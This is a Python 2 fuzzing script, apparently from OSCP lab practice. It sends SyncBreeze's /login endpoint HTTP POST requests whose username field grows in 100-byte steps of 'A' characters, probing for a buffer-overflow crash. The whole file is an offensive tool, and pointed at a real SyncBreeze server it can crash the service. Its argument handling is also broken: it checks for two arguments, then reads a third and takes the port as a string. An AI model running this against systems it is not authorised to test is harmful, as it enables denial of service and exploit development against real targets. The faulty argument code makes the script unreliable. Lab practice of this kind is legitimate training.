#!/usr/bin/python
import socket
import time
import sys

#Python script to fuzz SyncBreeze, OSCP LAB


host='192.168.179.10'
port=80
maxSize = 3000
size = 700
stepSize=100

if len(sys.argv) == 2:
    host=sys.argv[1]
    port=sys.argv[2]

url = "http://" +host+"/login"

while(size < maxSize):
  try:
    print "\nSending buffer with %s bytes" % size
    
    inputBuffer = "A" * size
    content = "username=" + inputBuffer + "&password=A"
    buffer = "POST /login HTTP/1.1\r\n"
    buffer += "Host:"+ host + "\r\n"
    buffer += "User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
    buffer += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
    buffer += "Accept-Language: en-US,en;q=0.5\r\n"
    buffer += "Referer: " +url + "\r\n"
    buffer += "Connection: close\r\n"
    buffer += "Content-Type: application/x-www-form-urlencoded\r\n"
    buffer += "Content-Length: "+str(len(content))+"\r\n"
    buffer += "\r\n"
    buffer += content
    
    s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    s.send(buffer)
    s.close()
    size += stepSize
    time.sleep(10)
    
  except:
    print "\nCould not connect!"
    sys.exit()
